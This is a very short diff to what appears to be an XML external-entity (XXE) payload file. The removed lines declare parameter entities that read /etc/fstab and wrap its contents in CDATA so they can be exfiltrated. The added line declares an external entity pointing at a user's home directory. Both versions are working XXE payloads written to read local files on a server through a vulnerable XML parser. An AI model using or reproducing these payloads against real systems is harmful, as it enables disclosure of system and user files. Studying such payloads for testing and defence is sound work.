@@ -1,4 +1,1 @@
-<!ENTITY % file SYSTEM "file:///etc/fstab">
-<!ENTITY % start "<![CDATA[">
-<!ENTITY % end "]]>">
-<!ENTITY % all "<!ENTITY Contents '%start;%file;%end;'>">
+   <!ENTITY homedir SYSTEM  "file:///home/http1234/" >]>
